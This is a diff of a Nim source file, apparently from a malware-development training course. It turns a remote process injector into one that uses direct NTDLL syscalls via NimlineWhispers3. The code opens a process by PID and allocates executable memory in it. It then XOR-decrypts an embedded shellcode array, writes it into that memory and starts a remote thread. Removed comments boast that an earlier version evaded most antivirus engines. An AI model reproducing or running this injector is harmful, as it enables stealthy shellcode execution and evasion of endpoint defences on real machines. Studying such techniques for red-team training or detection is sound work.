@@ -1,13 +1,12 @@
 import winim/lean
+include syscalls # slightly modified, see 'syscalls.nim'
 
-# Base code taken from Exercise 2, refer there if anything is unclear
+# Base code taken from Exercise 3, refer there if anything is unclear
+# This example additionally implements direct syscalls, based on the NimlineWhispers 3 project
+# https://github.com/klezVirus/NimlineWhispers3
+# As such, it has to call the Native (NTDLL) APIs directly, and not through the Win32 API
+# Luckily, NimlineWhispers3 takes care of function definitions for us, so we can just import it
 
-# While there is a lot more evasion to do here, this example bypasses most AV (1/26 on antiscan.me)
-# In its current form, it IS detected by Windows Defender
-# However, changing the shellcode to a larger one will get rid of this detection (for some reason)
-# Alternatively, refer to the example solution of Bonus Exercise 3 for an example that does not get detected statically (for now)
-
-# Helper function to XOR our shellcode to a byte seq
 proc xorByteSeq*(input: openArray[byte], key: int): seq[byte] {.noinline.} =
     let length = input.len
     var k = key
@@ -16,26 +15,45 @@ proc xorByteSeq*(input: openArray[byte], key: int): seq[byte] {.noinline.} =
         result[i] = uint8(input[i]) xor uint8(k)
 
 proc injectShellcode[I, T](shellcode: array[I, T]): void =
-    let processId: DWORD = 8520
+    let processId: DWORD = 5196
     
-    let pHandle = OpenProcess(PROCESS_ALL_ACCESS, false, processId)
-    defer: CloseHandle(pHandle)
-    # We get rid of static strings to decrease our footprint 
+    # Define variables needed for native API calls
+    var 
+        bytesWritten: SIZE_T
+        pcid: CLIENT_ID
+        pHandle: HANDLE
+        poa: OBJECT_ATTRIBUTES
+        rPtr: LPVOID
+        shellcode_size: SIZE_T = cast[SIZE_T](shellcode.len)
+        status: WINBOOL
+        tHandle: HANDLE
 
-    let rPtr = VirtualAllocEx(pHandle, NULL, cast[SIZE_T](shellcode.len), MEM_COMMIT, PAGE_EXECUTE_READ_WRITE)
+    # Initialize the CLIENT_ID object with the right PID
+    pcid.UniqueProcess = cast[DWORD](processId)
 
-    # Decrypt our shellcode before writing it
+    # Call NtOpenProcess (native equivalent of OpenProcess)
+    # Native APIs often take pointers (denoted with &) for both in- and output
+    status = NtOpenProcess(&pHandle, PROCESS_ALL_ACCESS, &poa, &pcid)
+
+    # Call NtAllocateVirtualMemory (native equivalent of VirtualAllocEx)
+    status = NtAllocateVirtualMemory(pHandle, &rPtr, 0, &shellcode_size, MEM_COMMIT, PAGE_EXECUTE_READWRITE)
+
+    # We can decrypt the payload as usual
     var decryptedShellcode = xorByteSeq(shellcode, 0x37)
 
-    var bytesWritten: SIZE_T
-    discard WriteProcessMemory(pHandle, rPtr, decryptedShellcode[0].addr, cast[SIZE_T](decryptedShellcode.len), addr bytesWritten)
+    # Call NtWriteVirtualMemory (native equivalent of WriteProcessMemory)
+    # Note the handling of the payload, we take the address of the first byte and its length
+    status = NtWriteVirtualMemory(pHandle, rPtr, unsafeAddr decryptedShellcode[0], shellcode_size-1, addr bytesWritten)
 
-    let tHandle = CreateRemoteThread(pHandle, NULL, 0, cast[LPTHREAD_START_ROUTINE](rPtr), NULL, 0, NULL)
-    defer: CloseHandle(tHandle)
+    # Call NtCreateThreadEx (native equivalent of CreateRemoteThread)
+    # It has a lot of options we don't use! :)
+    status = NtCreateThreadEx(&tHandle, THREAD_ALL_ACCESS, NULL, pHandle, rPtr, NULL, FALSE, 0, 0, 0, NULL)
+
+    # Post-injection clean-up
+    discard NtClose(tHandle)
+    discard NtClose(pHandle)
 
 when defined(windows):
-    # Define our encrypted shellcode
-    # I re-formatted the output from the 'Encrypt.cs' C# solution example, since string formatting in Nim is a pain :)
     const shellcode: array[296, byte] = [
         byte 0xcb, 0x7f, 0xb4, 0xd3, 0xc7, 0xdf, 0xf7, 0x37, 0x37, 0x37, 0x76, 0x66, 0x76, 0x67, 0x65,
         0x66, 0x61, 0x7f, 0x06, 0xe5, 0x52, 0x7f, 0xbc, 0x65, 0x57, 0x7f, 0xbc, 0x65, 0x2f, 0x7f,
